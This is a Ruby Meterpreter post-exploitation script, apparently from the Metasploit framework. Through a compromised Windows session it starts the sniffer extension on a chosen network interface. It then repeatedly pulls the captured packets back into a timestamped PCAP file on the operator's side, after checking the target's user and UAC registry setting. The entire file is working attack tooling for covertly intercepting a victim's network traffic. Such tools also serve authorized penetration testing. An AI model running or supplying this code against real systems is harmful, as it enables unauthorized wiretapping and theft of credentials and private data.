#Meterpreter script for monitoring and capturing packets and
#saving them in to  a PCAP file.
#Provided by Carlos Perez at carlos_perez[at]darkoperator.com
session = client
#Get Hostname
host,port = session.tunnel_peer.split(':')
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
# Create a directory for the logs
logs = ::File.join(Msf::Config.config_directory, 'logs', 'packetrecorder', host + filenameinfo )
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
logfile = logs + ::File::Separator + host + filenameinfo + ".cap"
#Interval for collecting Packets in seconds
packtime = 30
#Get user
user = session.sys.config.getuid

@@exec_opts = Rex::Parser::Arguments.new(
        "-h"  => [ false,  "Help menu."],
        "-t"  => [ true,  "Time interval in seconds between recollection of packet, default 30 seconds."],
        "-i"  => [ true,  "Interface ID number where all packet capture will be done."]
	#"-b"  => [ false, "Background session after starting the recording of packets."]
)

#Function for Starting Capture
def startsniff(session,intid)
	begin
                #Load Sniffer module
                session.core.use("sniffer")
                print_status("Starting Packet capture on interface #{intid}")
                #starting packet capture with a buffer size of 200,000 packets
                session.sniffer.capture_start(intid, 200000)
                print_status("Packet capture started")
	rescue ::Exception => e
                print_status("Error Starting Packet Capture: #{e.class} #{e}")
	end
end

#Function for Recording captured packets into PCAP file
def packetrecord(session, packtime, logfile,intid)
        begin
                rec = 1
                print_status("Packets being saved in to #{logfile}")
                #Inserting Packets every number of seconds specified
                print("[*] Recording .")
                while rec == 1
			path_cap = logfile
			path_raw = logfile + '.raw'
			fd = ::File.new(path_raw, 'wb+')
			#Flushing Buffers
			res = session.sniffer.capture_dump(intid)
			bytes_all = res[:bytes] || 0
			bytes_got = 0
			bytes_pct = 0
			while (bytes_all > 0)
				res = session.sniffer.capture_dump_read(intid,1024*512)
				bytes_got += res[:bytes]
				pct = ((bytes_got.to_f / bytes_all.to_f) * 100).to_i
				if(pct > bytes_pct)
					bytes_pct = pct
				end
				break if res[:bytes] == 0
                                fd.write(res[:data])
                        end

                        fd.close
                        #Converting raw file to PCAP
                        fd = nil
                        if(::File.exist?(path_cap))
                                fd = ::File.new(path_cap, 'ab+')
                        else
                                fd = ::File.new(path_cap, 'wb+')
                                fd.write([0xa1b2c3d4, 2, 4, 0, 0, 65536, 1].pack('NnnNNNN'))
                        end
                        pkts = {}
                        od = ::File.new(path_raw, 'rb')

                        # TODO: reorder packets based on the ID (only an issue if the buffer wraps)
                        while(true)
                                buf = od.read(20)
                                break if not buf

                                idh,idl,thi,tlo,len = buf.unpack('N5')
                                break if not len
                                if(len > 10000)
                                        print_error("Corrupted packet data (length:#{len})")
                                        break
                                end

                                pkt_id = (idh << 32) +idl
                                pkt_ts = Rex::Proto::SMB::Utils.time_smb_to_unix(thi,tlo)
                                pkt    = od.read(len)
                                fd.write([pkt_ts,0,len,len].pack('NNNN')+pkt)
                        end
                        od.close
                        fd.close

                        ::File.unlink(path_raw)
                        sleep(2)
                        print(".")
                        sleep(packtime.to_i)

                end
	rescue::Exception => e
		print("\n")
                print_status("#{e.class} #{e}")
		print_status("Stopping Packet sniffer...")
		session.sniffer.capture_stop(intid)
	end
end
#ion for Checking for UAC
def checkuac(session)
	uac = false
	begin
		winversion = session.sys.config.sysinfo
		if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
			print_status("Checking if UAC is enabled ...")
			key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
			root_key, base_key = session.sys.registry.splitkey(key)
			value = "EnableLUA"
			open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
			v = open_key.query_value(value)
			if v.data == 1
				uac = true
			else
				uac = false
			end
			open_key.close_key(key)
		end
	rescue ::Exception => e
		print_status("Error Checking UAC: #{e.class} #{e}")
	end
	return uac
end
def helpmsg
        print(
                "Packet Recorder Meterpreter Script\n" +
                  "This script will start the Meterpreter Sniffer and save all packets\n" +
                  "in a PCAP file for later anlysis. To stop capture hit Ctrl-C\n" +
                  "Usage:" +
                  @@exec_opts.usage
        )

end
# Parsing of Options
helpcall = 0
intid = 0
background = 0
@@exec_opts.parse(args) { |opt, idx, val|
        case opt

	when "-t"
                packtime = val
	when "-i"
                intid = val.to_i
	when "-h"
                helpmsg
                helpcall = 1
        end

}
if helpcall == 0
        if (user != "NT AUTHORITY\\SYSTEM") && intid != 0
                if not checkuac(session)
			startsniff(session,intid)
                        packetrecord(session,packtime,logfile,intid)
		else 
			print_line("[-] The Meterpreter process is not running as System and UAC is not enable, Insufficient Privileges to run")
                end
        elsif intid != 0
		startsniff(session,intid)
		packetrecord(session,packtime,logfile,intid)
	else
		helpmsg
	end
end
